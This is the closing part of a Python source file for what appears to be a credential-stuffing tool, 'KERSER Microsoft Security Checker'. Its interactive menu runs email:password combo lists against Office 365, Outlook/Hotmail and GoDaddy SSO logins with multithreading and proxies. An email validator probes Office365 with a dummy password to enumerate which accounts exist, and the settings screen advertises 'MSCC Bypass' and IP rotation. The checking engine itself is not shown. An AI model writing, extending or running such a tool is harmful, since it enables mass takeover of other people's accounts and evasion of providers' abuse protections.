                print(f"{Colors.ERROR}[✗] Please enter a valid number!{Style.RESET_ALL}")
        
        return {
            'combo_file': combo_file,
            'threads': threads,
            'use_proxy': use_proxy in ['yes', 'y', '1']
        }
    
    @staticmethod
    def run():
        """Run interactive menu"""
        UI.print_banner()
        
        while True:
            InteractiveMenu.display_menu()
            
            choice = input(f"{Colors.INFO}[?] Select option: {Colors.CYBER_WHITE}").strip()
            
            if choice == '1':
                print(f"\n{Colors.CYBER_GREEN}[✓] Office 365 Checker Selected{Style.RESET_ALL}")
                config = InteractiveMenu.get_checker_config()
                UI.print_loading_animation("Initializing Office 365 Checker", 2)
                checker = CheckerEngine(threads=config['threads'])
                checker.run(config['combo_file'])
                
            elif choice == '2':
                print(f"\n{Colors.CYBER_GREEN}[✓] Outlook/Hotmail Checker Selected{Style.RESET_ALL}")
                config = InteractiveMenu.get_checker_config()
                UI.print_loading_animation("Initializing Outlook Checker", 2)
                checker = CheckerEngine(threads=config['threads'])
                checker.run(config['combo_file'])
                
            elif choice == '3':
                print(f"\n{Colors.CYBER_GREEN}[✓] GoDaddy SSO Checker Selected{Style.RESET_ALL}")
                config = InteractiveMenu.get_checker_config()
                UI.print_loading_animation("Initializing GoDaddy SSO Checker", 2)
                checker = CheckerEngine(threads=config['threads'])
                checker.run(config['combo_file'])
                
            elif choice == '4':
                print(f"\n{Colors.CYBER_GREEN}[✓] All-in-One Multi-Platform Checker Selected (Recommended){Style.RESET_ALL}")
                config = InteractiveMenu.get_checker_config()
                UI.print_loading_animation("Initializing Multi-Platform Checker", 2)
                checker = CheckerEngine(threads=config['threads'])
                checker.run(config['combo_file'])
                
            elif choice == '5':
                print(f"\n{Colors.CYBER_GREEN}[✓] Email Validator Selected{Style.RESET_ALL}")
                InteractiveMenu.email_validator()
                
            elif choice == '6':
                print(f"\n{Colors.CYBER_GREEN}[✓] Settings & Configuration{Style.RESET_ALL}")
                InteractiveMenu.show_settings()
                
            elif choice == '0':
                print(f"\n{Colors.CYBER_BLUE}{'═' * 80}{Style.RESET_ALL}")
                print(f"{Colors.CYBER_GREEN}Thank you for using KERSER Microsoft Security Checker!{Style.RESET_ALL}")
                print(f"{Colors.CYBER_YELLOW}Visit: https://github.com/QASIM1401 {Style.RESET_ALL}")
                print(f"{Colors.CYBER_BLUE}{'═' * 80}{Style.RESET_ALL}\n")
                break
                
            else:
                print(f"{Colors.ERROR}[✗] Invalid option! Please try again.{Style.RESET_ALL}")
            
            input(f"\n{Colors.INFO}[i] Press Enter to continue...{Style.RESET_ALL}")
            print("\n" * 2)
    
    @staticmethod
    def email_validator():
        """Email existence validator"""
        print(f"\n{Colors.CYBER_BLUE}{'═' * 80}{Style.RESET_ALL}")
        print(f"{Colors.CYBER_MAGENTA}                    📧 EMAIL VALIDATOR                    {Style.RESET_ALL}")
        print(f"{Colors.CYBER_BLUE}{'═' * 80}{Style.RESET_ALL}\n")
        
        email_file = input(f"{Colors.INFO}[?] Enter email list file: {Colors.CYBER_WHITE}").strip()
        
        try:
            with open(email_file, 'r', encoding='utf-8', errors='ignore') as f:
                emails = [line.strip() for line in f if line.strip() and '@' in line]
            
            print(f"{Colors.SUCCESS}[✓] Loaded {len(emails)} emails{Style.RESET_ALL}")
            UI.print_loading_animation("Starting validation", 1.5)
            
            valid_count = 0
            invalid_count = 0
            
            for email in emails:
                # Check via Office365 API
                result = Office365Checker.check_via_api(email, "dummy_password")
                
                if result['status'] != 'invalid' or 'exist' not in result.get('message', '').lower():
                    print(f"{Colors.SUCCESS}[✓] {email} - EXISTS{Style.RESET_ALL}")
                    with open('Valid_Emails.txt', 'a') as f:
                        f.write(email + '\n')
                    valid_count += 1
                else:
                    print(f"{Colors.ERROR}[✗] {email} - NOT FOUND{Style.RESET_ALL}")
                    invalid_count += 1
            
            print(f"\n{Colors.SUCCESS}[✓] Validation complete! Valid: {valid_count} | Invalid: {invalid_count}{Style.RESET_ALL}")
            
        except FileNotFoundError:
            print(f"{Colors.ERROR}[✗] File not found!{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Colors.ERROR}[✗] Error: {e}{Style.RESET_ALL}")
    
    @staticmethod
    def show_settings():
        """Show current settings"""
        settings = f"""
{Colors.CYBER_BLUE}╔════════════════════════════════════════════════════════════════════════════╗
║{Colors.CYBER_MAGENTA}                         ⚙️  CURRENT SETTINGS                                {Colors.CYBER_BLUE}║
╠════════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  {Colors.INFO}Proxy Status      : {Colors.CYBER_WHITE}{'Enabled' if proxy_manager.enabled else 'Disabled':<50}{Colors.CYBER_BLUE}║
║  {Colors.INFO}Loaded Proxies    : {Colors.CYBER_WHITE}{len(proxy_manager.proxies) if proxy_manager.enabled else 0:<50}{Colors.CYBER_BLUE}║
║  {Colors.INFO}Timeout           : {Colors.CYBER_WHITE}20 seconds{' ' * 40}{Colors.CYBER_BLUE}║
║  {Colors.INFO}Retry Attempts    : {Colors.CYBER_WHITE}3{' ' * 51}{Colors.CYBER_BLUE}║
║  {Colors.INFO}MSCC Bypass       : {Colors.CYBER_WHITE}Enabled{' ' * 47}{Colors.CYBER_BLUE}║
║  {Colors.INFO}IP Rotation       : {Colors.CYBER_WHITE}Enabled{' ' * 47}{Colors.CYBER_BLUE}║
║                                                                            ║
╠════════════════════════════════════════════════════════════════════════════╣
║  {Colors.CYBER_GREEN}Supported Input Formats:                                                {Colors.CYBER_BLUE}║
║    {Colors.INFO}• email:password                                                        {Colors.CYBER_BLUE}║
║    {Colors.INFO}• email|password                                                        {Colors.CYBER_BLUE}║
║    {Colors.INFO}• email;password                                                        {Colors.CYBER_BLUE}║
║                                                                            ║
╠════════════════════════════════════════════════════════════════════════════╣
║  {Colors.CYBER_GREEN}Supported Platforms:                                                    {Colors.CYBER_BLUE}║
║    {Colors.INFO}✓ Microsoft Office 365                                                  {Colors.CYBER_BLUE}║
║    {Colors.INFO}✓ Outlook Web App (OWA)                                                 {Colors.CYBER_BLUE}║
║    {Colors.INFO}✓ Office 365 SSO GoDaddy                                                {Colors.CYBER_BLUE}║
║    {Colors.INFO}✓ Microsoft Live/Hotmail                                                {Colors.CYBER_BLUE}║
║    {Colors.INFO}✓ Azure AD Authentication                                               {Colors.CYBER_BLUE}║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(settings)

# ═══════════════════════════════════════════════════════════════════════════════
# 🚀 MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════
def main():
    """Main entry point"""
    try:
        # Set console title (Windows only)
        if sys.platform == 'win32':
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW("KERSER Microsoft Security Checker v5.0 | https://github.com/QASIM1401")
        
        # Run interactive menu
        InteractiveMenu.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Program interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.ERROR}[✗] Fatal error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
